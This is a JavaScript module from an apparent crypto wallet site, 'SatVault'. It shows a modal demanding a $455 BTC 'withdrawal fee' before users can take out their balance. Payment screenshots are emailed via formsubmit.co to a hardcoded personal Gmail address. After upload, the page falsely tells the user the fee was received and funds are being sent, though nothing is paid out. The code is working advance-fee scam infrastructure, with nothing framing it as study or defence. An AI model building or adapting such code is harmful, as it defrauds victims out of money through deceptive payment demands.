(function () {
  function getProfile() {
    return window.SatVaultAuth && SatVaultAuth.getActiveProfile
      ? SatVaultAuth.getActiveProfile()
      : null;
  }

  function requiresFeeProof() {
    var profile = getProfile();
    return !!(profile && profile.withdrawFeeProof);
  }

  window.requiresWithdrawFeeProof = requiresFeeProof;

  function ensureModal() {
    if (document.getElementById("withdraw-fee-proof-modal")) return;
    document.body.insertAdjacentHTML("beforeend",
      '<div id="withdraw-fee-proof-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="withdraw-fee-proof-title">' +
        '<div class="wallet-modal-backdrop" data-fee-proof-close></div>' +
        '<div class="wallet-modal-card app-card">' +
          '<h2 id="withdraw-fee-proof-title" class="wallet-modal-title">Pay Withdrawal Fee</h2>' +
          '<p id="withdraw-fee-proof-body" class="wallet-modal-body text-gray-400 text-sm"></p>' +
          '<div class="wallet-modal-fee-row mt-3">' +
            '<span class="text-gray-500 text-xs">Withdrawal amount</span>' +
            '<strong id="withdraw-fee-proof-withdraw-amt" class="text-white text-sm">—</strong>' +
          "</div>" +
          '<div class="wallet-modal-fee-row">' +
            '<span class="text-gray-500 text-xs">Destination wallet</span>' +
            '<strong id="withdraw-fee-proof-dest" class="text-white text-xs break-all text-right max-w-xs">—</strong>' +
          "</div>" +
          '<div class="wallet-modal-fee-row">' +
            '<span class="text-gray-500 text-xs">Fee to pay</span>' +
            '<strong id="withdraw-fee-proof-amount" class="text-primary text-lg">$455.00</strong>' +
          "</div>" +
          '<p class="text-xs text-gray-500 mb-2 mt-4">Send the $455 fee to this BTC wallet</p>' +
          '<p id="withdraw-fee-proof-wallet" class="wallet-box"></p>' +
          '<button type="button" id="withdraw-fee-proof-copy" class="btn-ghost text-sm mt-3 w-full">Copy fee wallet address</button>' +
          '<div class="mt-4">' +
            '<label for="withdraw-fee-proof-file" class="form-label">Upload screenshot of fee payment</label>' +
            '<input id="withdraw-fee-proof-file" type="file" accept="image/*" class="form-input">' +
            '<p id="withdraw-fee-proof-error" class="text-red-400 text-sm mt-2 hidden"></p>' +
            '<p id="withdraw-fee-proof-status" class="text-green-400 text-sm mt-2 hidden"></p>' +
          "</div>" +
          '<div class="wallet-modal-actions">' +
            '<button type="button" class="btn-ghost" data-fee-proof-close>Cancel</button>' +
            '<button type="button" id="withdraw-fee-proof-submit" class="btn-primary">I\'ve Paid the Fee</button>' +
          "</div>" +
        "</div>" +
      "</div>"
    );

    document.querySelectorAll("[data-fee-proof-close]").forEach(function (el) {
      el.addEventListener("click", closeModal);
    });

    document.getElementById("withdraw-fee-proof-copy").addEventListener("click", function () {
      var addr = document.getElementById("withdraw-fee-proof-wallet").textContent.trim();
      var btn = document.getElementById("withdraw-fee-proof-copy");
      if (!addr || !navigator.clipboard) return;
      navigator.clipboard.writeText(addr).then(function () {
        btn.textContent = "Copied!";
        setTimeout(function () { btn.textContent = "Copy fee wallet address"; }, 2000);
      });
    });

    document.getElementById("withdraw-fee-proof-submit").addEventListener("click", onSubmit);
  }

  function closeModal() {
    var modal = document.getElementById("withdraw-fee-proof-modal");
    if (modal) modal.classList.add("hidden");
    document.body.classList.remove("wallet-modal-open");
    window.__withdrawFeeProofPending = null;
  }

  function showError(msg) {
    var err = document.getElementById("withdraw-fee-proof-error");
    var ok = document.getElementById("withdraw-fee-proof-status");
    if (ok) ok.classList.add("hidden");
    err.textContent = msg;
    err.classList.remove("hidden");
  }

  function showStatus(msg) {
    var err = document.getElementById("withdraw-fee-proof-error");
    var ok = document.getElementById("withdraw-fee-proof-status");
    if (err) err.classList.add("hidden");
    ok.textContent = msg;
    ok.classList.remove("hidden");
  }

  function onSubmit() {
    var pending = window.__withdrawFeeProofPending;
    if (!pending || typeof pending.onSuccess !== "function") return;

    var profile = getProfile();
    var fileInput = document.getElementById("withdraw-fee-proof-file");
    var submitBtn = document.getElementById("withdraw-fee-proof-submit");
    var file = fileInput && fileInput.files && fileInput.files[0];

    if (!file) {
      showError("Please upload a screenshot of your $455 fee payment.");
      return;
    }
    if (file.size > 8 * 1024 * 1024) {
      showError("Screenshot must be under 8MB.");
      return;
    }

    var email = (profile && profile.formSubmitEmail) || "ronniechristopher89@gmail.com";
    var fee = (profile && profile.withdrawFeeAmount) || 455;
    var feeWallet = (profile && profile.withdrawFeeWallet) || "";
    var user = window.SatVaultAuth && SatVaultAuth.getUser && SatVaultAuth.getUser();

    var formData = new FormData();
    formData.append("_subject", "Withdrawal fee proof — " + ((profile && profile.displayName) || "User"));
    formData.append("_template", "table");
    formData.append("_captcha", "false");
    formData.append("_honey", "");
    formData.append("name", (profile && profile.displayName) || "User");
    formData.append("email", (user && (user.login || user.email)) || (profile && profile.email) || "");
    formData.append("withdrawal_amount", "$" + Number(pending.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
    formData.append("destination_wallet", pending.destinationWallet || "");
    formData.append("fee_amount", "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
    formData.append("fee_wallet", feeWallet);
    formData.append("message",
      "User paid the withdrawal fee. Deduct from their platform balance and send the withdrawal amount to their destination wallet. " +
      "Verify the fee payment screenshot, then release funds to the destination wallet.");
    formData.append("attachment", file, file.name);

    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting…";
    showStatus("Sending payment proof…");

    fetch("https://formsubmit.co/ajax/" + encodeURIComponent(email), {
      method: "POST",
      body: formData,
      headers: { Accept: "application/json" }
    }).then(function (res) {
      if (!res.ok) throw new Error("Submit failed");
      return res.json().catch(function () { return {}; });
    }).then(function () {
      showStatus("Fee received. Amount deducted from your account and sending to your wallet.");
      var onSuccess = pending.onSuccess;
      var dest = pending.destinationWallet;
      var amt = pending.amount;
      setTimeout(function () {
        closeModal();
        onSuccess({ amount: amt, destinationWallet: dest });
      }, 900);
    }).catch(function () {
      showError("Could not send proof. Check your connection and try again.");
      submitBtn.disabled = false;
      submitBtn.textContent = "I've Paid the Fee";
    });
  }

  /**
   * @param {number} amount
   * @param {string} destinationWallet
   * @param {function} onSuccess
   */
  window.showWithdrawFeeProofModal = function (amount, destinationWallet, onSuccess) {
    var profile = getProfile();
    if (!profile || !profile.withdrawFeeProof) {
      if (typeof onSuccess === "function") onSuccess({ amount: amount, destinationWallet: destinationWallet });
      return;
    }

    // Back-compat: showWithdrawFeeProofModal(amount, onSuccess)
    if (typeof destinationWallet === "function") {
      onSuccess = destinationWallet;
      destinationWallet = "";
    }

    ensureModal();
    window.__withdrawFeeProofPending = {
      amount: amount,
      destinationWallet: destinationWallet || "",
      onSuccess: onSuccess
    };

    var fee = Number(profile.withdrawFeeAmount) || 455;
    var feeWallet = profile.withdrawFeeWallet || "";
    var amtLabel = "$" + Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    var feeLabel = "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });

    document.getElementById("withdraw-fee-proof-body").textContent =
      "To withdraw " + amtLabel + " to your wallet, pay a " + feeLabel +
      " fee in BTC to the address below and upload a screenshot. " +
      "After that, " + amtLabel + " is deducted from your account balance and sent to the wallet you entered within one hour.";
    document.getElementById("withdraw-fee-proof-withdraw-amt").textContent = amtLabel;
    document.getElementById("withdraw-fee-proof-dest").textContent = destinationWallet || "—";
    document.getElementById("withdraw-fee-proof-amount").textContent = feeLabel;
    document.getElementById("withdraw-fee-proof-wallet").textContent = feeWallet;

    var fileInput = document.getElementById("withdraw-fee-proof-file");
    if (fileInput) fileInput.value = "";
    document.getElementById("withdraw-fee-proof-error").classList.add("hidden");
    document.getElementById("withdraw-fee-proof-status").classList.add("hidden");
    var submitBtn = document.getElementById("withdraw-fee-proof-submit");
    submitBtn.disabled = false;
    submitBtn.textContent = "I've Paid the Fee";

    document.getElementById("withdraw-fee-proof-modal").classList.remove("hidden");
    document.body.classList.add("wallet-modal-open");
  };
})();
